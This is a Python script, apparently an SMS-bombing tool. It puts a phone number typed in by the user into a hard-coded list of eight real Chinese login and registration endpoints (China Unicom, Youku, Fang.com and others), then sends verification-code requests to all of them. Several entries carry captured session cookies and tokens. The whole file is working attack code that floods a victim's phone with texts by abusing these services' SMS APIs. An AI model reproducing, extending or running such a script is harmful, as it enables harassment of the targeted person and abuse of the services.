import json
import re
import time

import requests

# region 数据准备

# 短信接口列表
api_list = [
{
    #1 联通营业厅
    "url": "https://uac.10010.com/portal/Service/SendMSG?callback=jQuery172036265687890949017_1586438187147&req_time=1586438480301&mobile=target_Phone&_=1586438480302",
    "type": "GET",
     "cookie":"mallcity=71|710; citycode=710; userprocode=071; WT_FPC=id=2422b5d4f51aee876a31586438180630:lv=1586438180634:ss=1586438180630; SHOP_PROV_CITY=; unisecid=FAA8B3000F8EA04F56922AEBD24B1C23; _n3fa_cid=9d011649a30e43cb8599da63cf13f997; _n3fa_ext=ft=1586438196; _n3fa_lvt_a9e72dfe4a54a20c3d6e671b3bad01d9=1586438196; _n3fa_lpvt_a9e72dfe4a54a20c3d6e671b3bad01d9=1586438196; ckuuid=ce5826760c94667e99027a4ca27a4e5a; uacverifykey=ipl593cb570aab5f50f13c4bbc1c39cca106sr",
    },

    #2 优酷
    {
        "url": "https://cnpassport.youku.com/newlogin/sms/send.do?appName=youku&fromSite=23",
        "parm": {
            "type": "authenticode",
            "loginId": "target_Phone",
            "phoneCode": "86",
            "countryCode": "CN",
            "ua":"122#Kgkh74j+EEx9yJpZMEpaEJponDJE7SNEEP7rEJ+//CeERFQLpo7iEDpWnDEeK51HpyGZp9hBuDEEJFOPpC76EJponDJL7gNpEPXZpJRgu4Ep+FQLpoGUEJLWn4yP7SQEEyuLpERGVZGwprrMfI8ijN0M1BYr8SY9s+fIY0IJExkYmQWrFFxhlJnwxNaMo6GAJZ8RSoAnDSPZGBS9X5+v/UFD28G4YAGP5ifMxYH7Ag9SUcNYw5Hsm7pGvV0EBRTVEaTy8oL6+wmuyAHyqIjGplSj7Wp1uOezMtjdhobkSJ7VkF+D7W3bEEpxngR4eiyr8PVr8Cp6+DPEyFfOefMOwzVanSbWuO5EELGA8oL6JNEEyBfDqMfbDEpCnSL1ul0EDLVr8CpUJzbEyF3mqW32E5pamMp1uOOWDLAr8oLUaN+9y6AIW8bZSJ+elJa9tqs6u7yHffQZ4foz+PnNNKPESLYWltnGkJmQ5Vm1uS9pQ5Ydq4ib3DH9JGwz7fgvjcoLicWLRctaEzxduCjYatkpRAcpgC+w7FDnThVclQd7Z4tJw0iRFibP5X5amtTZ11iN0p+e6yPI4cpnaZ1yk/qbhXemg5X/4AHYsQY+NUi5Zs5mXIFd9rxDIsQsWCxHVnihKbOyXybNsTnY7W8sRfhJnyvcw4Xf+ak6AJJ23S97Oso4UY+RJvw1RO3X7F9YK9vR3VDk2ysrVgvG/jBt5CkINQvheHkI2aqcGmQxgFox/4QwhhF8XazG4pmAJ1pxBki/X8KM1Lgrig+u5dqkJsWjSYobUkkaRTCZ3GK5AOH98ToHNHMOfAy1eGtWKtQPEG7y4EltHgimnbQ5l9PbULTtb3egwvqRBrmKp6RFQ35nh47CpU5XR1Xnqakt1aZO9XwmiGBoxJ+jDS8Bg557ScCbS9qpWmL3DRL3E2g8s4Fdspo12JQkYJv6xcUm9Djg6PxO4byTwoxFxFQzCfJ4loW6s1gn73oayH4QofRXm4n1EUU1AZtN+BxQY37vTaLymfzg8U1unDO0EQzxjY/stXGOFpnACwQjtkwohdafxGtHLG9g02OaSMAIeeQgZOhe77Pb9pbMROpgw22RLvxI4OAkx44lC17s7lsOf2JIsZpBwQ4O9oUnmxSgFcbKxSw6sbzhKgWZb8/BoRS106TNwcznWuWjHHtmkoP+6gwhylhQHOm/v54dyGyMsqFrM3uCsW5lwFdMi3x85YzYeZnY8J=="
        },
        "type": "POST"
    },

#3 房天下
    {
        "url": "https://passport.fang.com/loginsendmsm.api",
        "parm": {
            "type": "authenticode",
            "MobilePhone": "target_Phone",
            "Operatetype": "0",
            "Service": "soufun-passport-web",
        },
        "type": "POST"
    },

#4 蜜桃屋
    {
        "url": "https://passport.fang.com/loginsendmsm.api",
        "parm": {
            "type": "register",
            "phone": "target_Phone",
            "username": "!@#$#",
            "password": "soufun-passport-web",
            "nickname":"QWEDSDS",
            "sign":"e32208c1da5a44cdb6659e71ff4cd2de44603573.1587351732"
        },
        "type": "POST"
    },

#5 会计手机网
    {
    "url": "http://member.chinaacc.com/uc/loginRegister/sendMsg?mobilePhone=target_Phone&referer=http%3A%2F%2Fm.chinaacc.com%2Flogin%2Findex.shtml&randCode=&ucToken=DBBB4BE04CB3EEC8AEBAB01F5EF09B74-5eeee2f15e21e79ef97c5421cd9df6b4-01&photoRandCodeSign=&jsonpCallback=myjsonp1587352162230",
    "type": "GET",
     "cookie":"hd_uid=CjsBKF6dEkw8wwrOBNU8Ag==; trackerSdkVisitor_isNew=true; bdp_uuid=24f55b25fa-101a76060-4ba1d674ef; zg_did=%7B%22did%22%3A%20%22171958f7ef0297-0d4050449bda7d-3c3f5a0c-100200-171958f7ef12a5%22%7D; zg_9b4551cf447148b0845f31f91e8a524d=%7B%22sid%22%3A%201587352141558%2C%22updated%22%3A%201587352141565%2C%22info%22%3A%201587352141563%2C%22superProperty%22%3A%20%22%7B%7D%22%2C%22platform%22%3A%20%22%7B%7D%22%2C%22utm%22%3A%20%22%7B%7D%22%2C%22referrerDomain%22%3A%20%22www.baidu.com%22%7D; trackerSdkData={%22uid%22:%22%22%2C%22platform_source%22:%22web%22%2C%22time%22:1587352141609%2C%22bdp_uuid%22:%2224f55b25fa-101a76060-4ba1d674ef%22}; clientID=14bCdDs6Fhz6VX2lUkjLUpHDaYYeprP2CjYzyGZXvo5k7BdMT1_L40MEPa2YCE-D1ALL08UOnJoU%0D%0AbvnprVAvVyfxykTsJx-iAcY9nsSw-XA%0D%0A; client_ucToken=DBBB4BE04CB3EEC8AEBAB01F5EF09B74-5eeee2f15e21e79ef97c5421cd9df6b4-01; logRegphotoCode=logRegphotoCode_0a350653b34c5b1bf22aeef4ad34913a",
    },

#6 人民视频
    {
        "url": "http://vblog.people.com.cn/v2/smc",
        "parm": {
            "mobileInput": "target_Phone",
        },
        "type": "POST"
    },

#7 哥伦布采购
    {
        "url": "http://www.91glb.com/sms/sms.php?act=send&flag=phonelogin",
        "parm": {
            "mobile": "target_Phone",
            "seccode":"4891",
            "username":"undefined",
            "sms_value":"sms_phonelogin",
        },
        "type": "POST"
    },


#8 人人租号
    {
        "url": "http://www.zuhaoapp.com/Login/SendVerifyCode",
        "parm": {
            "phone": "target_Phone",
        },
        "type": "POST"
    },


]


# 替换号码
def replacePhone(phone):
    # 替换号码后的列表
    target_list = []
    for api in api_list:
        api_str = json.dumps(api)
        api_str = api_str.replace("target_Phone", phone)
        target_list.append(json.loads(api_str))
    return target_list


# endregion


# region 处理方法
# 默认处理方法
def default(jiekou, headers):
    resp = requests.request(
        url=jiekou["url"],
        method=jiekou["type"],
        headers=headers,
        data=jiekou.get("parm", "")
    )
    print(resp.status_code)
    print(resp.text)
    print(resp.url)
    print()

# 主函数
def run(jiekou_list):
    for jiekou in jiekou_list:
        # special = jiekou.get("special")
        # if special:
        #     # 判断是否为特殊请求
        #     caseSpecial(jiekou, special)
        # else:
            headers = {
                'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 12_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/16B92 Html5Plus/1.0',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'zh-CN,zh-TW;q=0.8,zh;q=0.6,en;q=0.4,ja;q=0.2',
                'cache-control': 'max-age=0',
                "X-Requested-With": "XMLHttpRequest",
                'cookie': jiekou.get("cookie", ""),
                "referer": jiekou.get("referer", ""),
            }
            if jiekou.get("headers"):
                headers = jiekou.get("headers")

            # 默认处理方法
            default(jiekou, headers)


if __name__ == '__main__':
    phone = input("输入手机号: ")
    target_list = replacePhone(phone)
    run(target_list)